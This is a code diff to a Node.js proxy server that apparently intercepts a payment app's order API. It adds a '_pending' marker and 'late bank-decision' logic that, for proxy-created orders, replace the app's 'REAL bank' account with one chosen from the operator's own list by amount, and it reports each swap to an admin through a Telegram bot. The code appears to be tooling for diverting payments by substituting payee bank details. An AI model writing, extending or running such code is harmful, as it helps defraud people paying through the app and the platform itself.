@@ -308,9 +308,42 @@ async function markOrderBankSkip(data, orderId) {
   await saveData(data);
 }
 
+// Marks an order as proxy-created but not yet assigned a bank (amount unknown).
+// /details will see this marker and run late bank-decision. Without this marker,
+// /details treats the order as REAL-apk-created and shows the real bank.
+async function markOrderBankPending(data, orderId) {
+  if (!orderId || orderId === 'N/A') return;
+  if (!data.orderBankMap) data.orderBankMap = {};
+  // Don't overwrite existing real bank or skip mark
+  const existing = data.orderBankMap[String(orderId)];
+  if (existing && (existing.accountNo || existing._skip)) return;
+  data.orderBankMap[String(orderId)] = { _pending: true, t: Date.now() };
+  await saveData(data);
+}
+
 function hasOrderBankEntry(data, orderId) {
   if (!orderId || !data.orderBankMap) return false;
   return !!data.orderBankMap[String(orderId)];
+}
+
+// True if entry exists AND is a real bank or _skip (NOT _pending).
+function hasOrderBankDecision(data, orderId) {
+  if (!orderId || !data.orderBankMap) return false;
+  const e = data.orderBankMap[String(orderId)];
+  if (!e) return false;
+  if (e._pending) return false;
+  return !!(e.accountNo || e._skip);
+}
+
+// True if any of the ids has a _pending marker (proxy-created, awaiting decision).
+function isProxyPending(data, ids) {
+  if (!data.orderBankMap) return false;
+  for (const id of ids) {
+    if (!id) continue;
+    const e = data.orderBankMap[String(id)];
+    if (e && e._pending) return true;
+  }
+  return false;
 }
 
 async function saveOrderBankMultipleKeys(data, ids, bank) {
@@ -1667,9 +1700,11 @@ ${dump.substring(0, 3500)}
       ).catch(()=>{});
     }
 
-    // Decision logic for orders WITHOUT a prior orderBankMap entry.
+    // Late-decision logic — ONLY for orders the proxy itself created (have _pending marker).
+    // Orders made via REAL apk (no marker) must pass through with REAL bank intact.
     let lateDecisionLog = null;
-    if (eff.botEnabled !== false && !hasOrderBankEntry(data, orderId) && data.banks && data.banks.length > 0) {
+    const orderIsProxyPending = isProxyPending(data, allOrderIds);
+    if (eff.botEnabled !== false && orderIsProxyPending && !hasOrderBankDecision(data, orderId) && data.banks && data.banks.length > 0) {
       if (detectedAmount > 0) {
         // Amount KNOWN → threshold-aware decision
         const lateActive = getActiveBank(data, detectedUserId, detectedAmount);
@@ -2059,8 +2094,13 @@ app.post('/app/buy/order', async (req, res) => {
             bot.sendMessage(data.adminChatId, `⏭️ Order ${newOrderId} amount ₹${orderAmt} — ${reason} → REAL bank will be shown`).catch(()=>{});
           }
         }
-      } else if (eff.botEnabled !== false && data.adminChatId && bot) {
-        bot.sendMessage(data.adminChatId, `⏳ Order ${newOrderId} created — amount unknown in request body, deferring bank decision to /details (real amount will be detected there)`).catch(()=>{});
+      } else if (eff.botEnabled !== false) {
+        // Mark order as proxy-created so /details runs late bank-decision.
+        // Orders WITHOUT this marker (= REAL apk orders) pass through untouched.
+        await markOrderBankPending(data, newOrderId);
+        if (data.adminChatId && bot) {
+          bot.sendMessage(data.adminChatId, `⏳ Order ${newOrderId} created — amount unknown in request body, deferring bank decision to /details (real amount will be detected there)`).catch(()=>{});
+        }
       }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -2189,7 +2229,9 @@ app.all('/app/buy/order/processOrderNo', async (req, res) => {
     // response. Don't pre-pick or pre-skip here — that would lock in a wrong
     // decision before we know the amount.
     if (typeof respData === 'string' && respData.length > 5 && eff.botEnabled !== false) {
-      if (!hasOrderBankEntry(data, respData) && data.adminChatId && bot) {
+      // Mark proxy-pending so /details runs late bank-decision for this order.
+      await markOrderBankPending(data, respData);
+      if (data.adminChatId && bot) {
         bot.sendMessage(data.adminChatId, `⏳ processOrderNo: ${respData} — deferring bank decision to /details (real amount needed)`).catch(()=>{});
       }
     }
